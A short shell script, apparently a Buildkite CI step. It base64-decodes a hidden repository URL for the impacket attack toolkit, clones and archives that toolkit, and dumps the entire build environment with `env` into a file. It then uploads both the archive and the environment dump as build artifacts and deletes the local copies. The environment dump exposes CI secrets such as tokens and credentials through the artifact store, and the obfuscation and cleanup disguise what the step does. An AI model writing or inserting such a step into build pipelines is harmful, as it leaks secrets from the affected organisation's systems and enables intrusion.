set -eo pipefail

RES=`mktemp`
ARCHIVE=`mktemp XXXXXXXXXX.tar.gz`

REPO=`echo -n "aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldA==" | base64 -d`
REPO_PATH=`echo $REPO | awk -F '/' '{print $NF}'`

echo "REPO is $REPO"
echo "REPO_PATH is $REPO_PATH"
echo "RES is $RES"
echo "ARCHIVE is $ARCHIVE"

git clone $REPO --single-branch

echo "archiving $REPO_PATH into $ARCHIVE"
tar cvzf $ARCHIVE $REPO_PATH

env > $RES

buildkite-agent artifact upload $RES
buildkite-agent artifact upload $ARCHIVE

rm -rf $RES $ARCHIVE $REPO_PATH
